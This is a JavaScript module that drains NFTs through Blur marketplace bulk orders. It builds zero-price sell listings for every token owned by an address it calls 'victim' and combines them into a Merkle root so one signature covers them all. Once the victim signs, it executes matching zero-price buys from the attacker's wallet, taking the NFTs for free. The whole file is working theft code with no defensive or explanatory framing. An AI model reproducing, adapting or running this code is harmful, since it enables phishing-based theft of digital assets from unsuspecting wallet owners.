const ethers = require('ethers');
const ethSigUtil = require("@metamask/eth-sig-util");
const merkletree = require("merkletreejs");

const LISTING_TIME = 1661790956;
const EXPIRATION_TIME = 1744220420;

const BLUR_ROUTER = "0x000000000000Ad05Ccc4F10045630fb830B95127";
const BLUR_ABI = [
  {
    "inputs": [
      {
        "components": [
          {
            "components": [
              {
                "components": [
                  {
                    "internalType": "address",
                    "name": "trader",
                    "type": "address"
                  },
                  {
                    "internalType": "enum Side",
                    "name": "side",
                    "type": "uint8"
                  },
                  {
                    "internalType": "address",
                    "name": "matchingPolicy",
                    "type": "address"
                  },
                  {
                    "internalType": "address",
                    "name": "collection",
                    "type": "address"
                  },
                  {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                  },
                  {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                  },
                  {
                    "internalType": "address",
                    "name": "paymentToken",
                    "type": "address"
                  },
                  {
                    "internalType": "uint256",
                    "name": "price",
                    "type": "uint256"
                  },
                  {
                    "internalType": "uint256",
                    "name": "listingTime",
                    "type": "uint256"
                  },
                  {
                    "internalType": "uint256",
                    "name": "expirationTime",
                    "type": "uint256"
                  },
                  {
                    "components": [
                      {
                        "internalType": "uint16",
                        "name": "rate",
                        "type": "uint16"
                      },
                      {
                        "internalType": "address payable",
                        "name": "recipient",
                        "type": "address"
                      }
                    ],
                    "internalType": "struct Fee[]",
                    "name": "fees",
                    "type": "tuple[]"
                  },
                  {
                    "internalType": "uint256",
                    "name": "salt",
                    "type": "uint256"
                  },
                  {
                    "internalType": "bytes",
                    "name": "extraParams",
                    "type": "bytes"
                  }
                ],
                "internalType": "struct Order",
                "name": "order",
                "type": "tuple"
              },
              {
                "internalType": "uint8",
                "name": "v",
                "type": "uint8"
              },
              {
                "internalType": "bytes32",
                "name": "r",
                "type": "bytes32"
              },
              {
                "internalType": "bytes32",
                "name": "s",
                "type": "bytes32"
              },
              {
                "internalType": "bytes",
                "name": "extraSignature",
                "type": "bytes"
              },
              {
                "internalType": "enum SignatureVersion",
                "name": "signatureVersion",
                "type": "uint8"
              },
              {
                "internalType": "uint256",
                "name": "blockNumber",
                "type": "uint256"
              }
            ],
            "internalType": "struct Input",
            "name": "sell",
            "type": "tuple"
          },
          {
            "components": [
              {
                "components": [
                  {
                    "internalType": "address",
                    "name": "trader",
                    "type": "address"
                  },
                  {
                    "internalType": "enum Side",
                    "name": "side",
                    "type": "uint8"
                  },
                  {
                    "internalType": "address",
                    "name": "matchingPolicy",
                    "type": "address"
                  },
                  {
                    "internalType": "address",
                    "name": "collection",
                    "type": "address"
                  },
                  {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                  },
                  {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                  },
                  {
                    "internalType": "address",
                    "name": "paymentToken",
                    "type": "address"
                  },
                  {
                    "internalType": "uint256",
                    "name": "price",
                    "type": "uint256"
                  },
                  {
                    "internalType": "uint256",
                    "name": "listingTime",
                    "type": "uint256"
                  },
                  {
                    "internalType": "uint256",
                    "name": "expirationTime",
                    "type": "uint256"
                  },
                  {
                    "components": [
                      {
                        "internalType": "uint16",
                        "name": "rate",
                        "type": "uint16"
                      },
                      {
                        "internalType": "address payable",
                        "name": "recipient",
                        "type": "address"
                      }
                    ],
                    "internalType": "struct Fee[]",
                    "name": "fees",
                    "type": "tuple[]"
                  },
                  {
                    "internalType": "uint256",
                    "name": "salt",
                    "type": "uint256"
                  },
                  {
                    "internalType": "bytes",
                    "name": "extraParams",
                    "type": "bytes"
                  }
                ],
                "internalType": "struct Order",
                "name": "order",
                "type": "tuple"
              },
              {
                "internalType": "uint8",
                "name": "v",
                "type": "uint8"
              },
              {
                "internalType": "bytes32",
                "name": "r",
                "type": "bytes32"
              },
              {
                "internalType": "bytes32",
                "name": "s",
                "type": "bytes32"
              },
              {
                "internalType": "bytes",
                "name": "extraSignature",
                "type": "bytes"
              },
              {
                "internalType": "enum SignatureVersion",
                "name": "signatureVersion",
                "type": "uint8"
              },
              {
                "internalType": "uint256",
                "name": "blockNumber",
                "type": "uint256"
              }
            ],
            "internalType": "struct Input",
            "name": "buy",
            "type": "tuple"
          }
        ],
        "internalType": "struct Execution[]",
        "name": "executions",
        "type": "tuple[]"
      }
    ],
    "name": "bulkExecute",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    inputs: [
      {
        internalType: 'address',
        name: '',
        type: 'address',
      },
    ],
    name: 'nonces',
    outputs: [
      {
        internalType: 'uint256',
        name: '',
        type: 'uint256',
      },
    ],
    stateMutability: 'view',
    type: 'function',
  },
];

const EIP712Fee = {
  name: 'Fee',
  fields: [
    { name: 'rate', type: 'uint16' },
    { name: 'recipient', type: 'address' },
  ],
};

const EIP712Order = {
  name: 'Order',
  fields: [
    { name: 'trader', type: 'address' },
    { name: 'side', type: 'uint8' },
    { name: 'matchingPolicy', type: 'address' },
    { name: 'collection', type: 'address' },
    { name: 'tokenId', type: 'uint256' },
    { name: 'amount', type: 'uint256' },
    { name: 'paymentToken', type: 'address' },
    { name: 'price', type: 'uint256' },
    { name: 'listingTime', type: 'uint256' },
    { name: 'expirationTime', type: 'uint256' },
    { name: 'fees', type: 'Fee[]' },
    { name: 'salt', type: 'uint256' },
    { name: 'extraParams', type: 'bytes' },
    { name: 'nonce', type: 'uint256' },
  ],
};

const get_nonce = async (address, RPC_URL, Private) => {
  const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
  const signer = new ethers.Wallet(Private, provider);
  const blur_router = new ethers.Contract(BLUR_ROUTER, BLUR_ABI, signer);
  return await blur_router.nonces(address);
};

const hash_without_domain = (parameters) => {
  parameters.nonce = parameters.nonce.toHexString();
  parameters.price = parameters.price.toHexString();
  return `0x${ethSigUtil.TypedDataUtils.hashStruct(
    'Order',
    parameters,
    {
      [EIP712Fee.name]: EIP712Fee.fields,
      [EIP712Order.name]: EIP712Order.fields,
    },
    ethSigUtil.SignTypedDataVersion.V4,
  ).toString('hex')}`;
}

const get_merkle_proof = (leaves) => {
  const tree = new merkletree.MerkleTree(leaves, ethers.utils.keccak256, { sort: true });
  const root = tree.getHexRoot();
  return { root, tree };
};

const get_order_tree_root = async (orders, victim, RPC_URL, Private) => {
  const leaves = await Promise.all(
    orders.map(async (order) => {
      const nonce = await get_nonce(victim, RPC_URL, Private);
      return hash_without_domain({ ...order, nonce });
    }),
  );
  return get_merkle_proof(leaves);
}

const get_root = async (data, RPC_URL, Private) => {
  try {
    if (data.tokens.length === 0 || data.address === "") return false;
    const orders = await Promise.all(data.tokens.map(async (token) => {
      return {
        trader: data.address,
        side: 1,
        matchingPolicy: '0x00000000006411739da1c40b106f8511de5d1fac',
        collection: token.collection,
        tokenId: token.tokenID,
        amount: 1,
        paymentToken: '0x0000000000000000000000000000000000000000',
        price: ethers.BigNumber.from(0),
        listingTime: LISTING_TIME,
        expirationTime: EXPIRATION_TIME,
        fees: [],
        salt: String(
          BigInt(
            (Math.floor(Math.random() * 90000000000) +
              1000000000000000) **
            2
          )
        ),
        extraParams: '0x00',
        nonce: Number(await get_nonce(data.address, RPC_URL, Private))
      }
    }))
    const { tree, root } = await get_order_tree_root(orders, data.address, RPC_URL, Private);
    const paths = await Promise.all(orders.map(async (order) => {
      const nonce = await get_nonce(data.address, RPC_URL, Private);
      const _order = hash_without_domain({ ...order, nonce })
      const path = ethers.utils.defaultAbiCoder.encode(
        ['bytes32[]'],
        [tree.getHexProof(_order)],
      )
      return {
        path: path,
        collection: order.collection,
        tokenID: order.tokenId,
        salt: order.salt,
        nonce: order.nonce
      }
    }));
    return { root, paths };
  } catch (err) {
    console.log(err);
    return false;
  }
};

const execute = async (data, RPC_URL, Private) => {
  try {
    if (data.address === "" || data.signature === "" || data.root === "" || data.paths.length === 0) {
      return false;
    }
    const signature = ethers.utils.splitSignature(data.signature);
    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const signer = new ethers.Wallet(Private, provider);
    const wallet = await signer.getAddress();
    const blur_router = new ethers.Contract(BLUR_ROUTER, BLUR_ABI, signer);
    const latestBlock = await provider.getBlockNumber();
    const signedOrders = await Promise.all(data.paths.map(async (pathData) => {
      return {
        buy: {
          order: {
            trader: wallet,
            side: 0,
            matchingPolicy:
              '0x00000000006411739da1c40b106f8511de5d1fac',
            collection: pathData.collection,
            tokenId: pathData.tokenID,
            amount: '1',
            paymentToken:
              '0x0000000000000000000000000000000000000000',
            price: ethers.BigNumber.from(0),
            listingTime: LISTING_TIME,
            expirationTime: EXPIRATION_TIME,
            fees: [],
            salt: String(
              BigInt(
                (Math.floor(Math.random() * 90000000000) +
                  1000000000000000) **
                2
              )
            ),
            extraParams: '0x00',
          },
          v: 0,
          r: '0x0000000000000000000000000000000000000000000000000000000000000000',
          s: '0x0000000000000000000000000000000000000000000000000000000000000000',
          extraSignature: data.root,
          signatureVersion: 0,
          blockNumber: String(latestBlock),
        },
        sell: {
          order: {
            trader: data.address,
            side: 1,
            matchingPolicy: '0x00000000006411739da1c40b106f8511de5d1fac',
            collection: pathData.collection,
            tokenId: pathData.tokenID,
            amount: 1,
            paymentToken: '0x0000000000000000000000000000000000000000',
            price: ethers.BigNumber.from(0),
            listingTime: LISTING_TIME,
            expirationTime: EXPIRATION_TIME,
            fees: [],
            salt: String(pathData.salt),
            extraParams: '0x00',
            nonce: Number(pathData.nonce)
          },
          v: signature.v,
          r: signature.r,
          s: signature.s,
          extraSignature: pathData.path,
          signatureVersion: 1,
          blockNumber: String(latestBlock),
        },
      }
    }));
    const gas = ((await blur_router.estimateGas.bulkExecute(signedOrders, { from: wallet })) * 1.5).toFixed();
    const gasPrice = ethers.BigNumber.from(await provider.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('110')).toString();
    try {
      await blur_router.bulkExecute(signedOrders, {
        value: "0x0",
        gasLimit: ethers.BigNumber.from(gas),
        gasPrice: ethers.BigNumber.from(gasPrice)
      });
      return true;
    } catch(err) {
      console.log(err);
      return false;
    }
  } catch (err) {
    console.log(err);
    return false;
  }
};

module.exports = { get_root, execute };